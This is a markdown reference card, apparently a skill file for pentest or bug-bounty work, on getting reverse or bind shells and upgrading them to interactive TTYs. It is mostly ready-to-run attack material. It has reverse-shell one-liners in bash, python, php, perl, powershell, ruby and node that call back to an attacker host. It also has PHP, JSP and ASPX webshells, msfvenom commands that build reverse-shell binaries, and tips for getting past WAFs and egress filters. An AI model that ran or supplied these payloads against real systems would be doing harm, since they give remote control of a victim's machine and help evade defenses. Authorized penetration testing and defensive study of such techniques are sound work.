---
name: payloads-reverse-shells
description: >
  Get a reliable reverse (or bind) shell and upgrade it to a real interactive TTY. Load the moment
  you have code execution and need a shell back — RCE confirmed, a command-injection sink, an upload
  that runs, a webshell, a cron/service you control. Signals: "reverse shell", "get a shell", "nc
  listener", "shell is dumb / no tab completion", "which payload", stabilize/upgrade a shell.
domain: payloads
type: reference
stability: learning
modes: [pentest, bugbounty]
severity: high
mitre: [T1059, T1071]
cwe: [CWE-78, CWE-94]
tools: [nc, socat, pwncat, msfvenom]
schema_version: 1
---

# Reverse shells & TTY upgrade

## When it applies
You have command execution and want an interactive shell on an authorized target. Pick the payload
that matches what's installed on the victim, catch it on a listener, then upgrade it so editors,
job control, and tab-completion work. `$LHOST`/`$LPORT` below are your attacker IP and port.

## Why it works
A reverse shell makes the victim connect *out* to you (beating inbound firewalls); a bind shell
listens on the victim (use only when you can't receive connections). The victim's shell inherits no
PTY, so it's "dumb" until you attach one — the upgrade step gives you a full terminal.

## Method
**1 · Listener** (pick one):
```
nc -lvnp $LPORT                    # basic
rlwrap nc -lvnp $LPORT             # arrow keys / history
socat file:`tty`,raw,echo=0 tcp-listen:$LPORT   # fully interactive catcher
pwncat-cs -lp $LPORT               # auto-upgrades the shell for you
```

**2 · Payload — match it to what the victim has:**
```
# bash
bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
# python3
python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("$LHOST",$LPORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("bash")'
# php
php -r '$s=fsockopen("$LHOST",$LPORT);exec("bash <&3 >&3 2>&3");'
# perl
perl -e 'use Socket;$i="$LHOST";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");'
# powershell (one line; -e base64 form for filters)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('$LHOST',$LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sn=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sn,0,$sn.Length);$s.Flush()}"
```
Others when those are missing: `ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("$LHOST",$LPORT))'`,
Node `require('child_process').exec('bash -c "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"')`,
`Runtime.getRuntime().exec(...)` (Java), Groovy (Jenkins script console), Lua `os.execute(...)`.

**3 · Webshells** when the sink is a file you can reach over HTTP:
```
<?php system($_GET['cmd']); ?>        <!-- PHP  -->
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>   <!-- JSP -->
```
(ASPX: `Process.Start("cmd.exe","/c "+Request["cmd"])`.) Use the webshell to launch a payload above.

**4 · Filters/WAF** → base64 or URL-encode the bash one-liner, or use `powershell -enc <b64-UTF16LE>`;
see `payloads-waf-bypass`.

**5 · Compiled payloads** with msfvenom when you need a file/binary:
```
msfvenom -p linux/x64/shell_reverse_tcp   LHOST=$LHOST LPORT=$LPORT -f elf  -o s.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe  -o s.exe
msfvenom -p java/jsp_shell_reverse_tcp    LHOST=$LHOST LPORT=$LPORT -f war  -o s.war   # Tomcat
```

**6 · Upgrade the dumb shell to a real TTY:**
```
python3 -c 'import pty; pty.spawn("/bin/bash")'   # then:
# Ctrl-Z
stty raw -echo; fg                                 # re-attach with raw mode
export TERM=xterm; export SHELL=/bin/bash
stty rows 40 cols 160                              # match your window (fixes editors)
```

## Gotchas
- **The plain `bash -i >& /dev/tcp/...` needs bash** — `/bin/sh` (dash) won't do `/dev/tcp`; wrap as
  `bash -c '...'` or use another language.
- **Quote/escape for the sink** — inside a web param or YAML, encode special chars; a raw `&`/`|`/space
  often breaks the injection before it runs.
- **Reverse blocked by egress filtering** → try common outbound ports (443/53), or a bind shell.
- **Shell dies on Ctrl-C** until upgraded — do the TTY upgrade before running interactive tools.
- Prefer `pwncat-cs`/`socat` for stability on long sessions; note the listener port in your log.

## Verify success
An interactive prompt on the target where `id`/`whoami` runs, Ctrl-C and tab-completion work, and an
editor (`vi`) renders correctly — a stable shell to work from.

## References
PayloadsAllTheThings (Reverse Shell Cheat Sheet); revshells.com; `pwncat-cs`, `socat` docs.
Related: `payloads-file-transfers`, `payloads-waf-bypass`, `privesc-arsenal`.
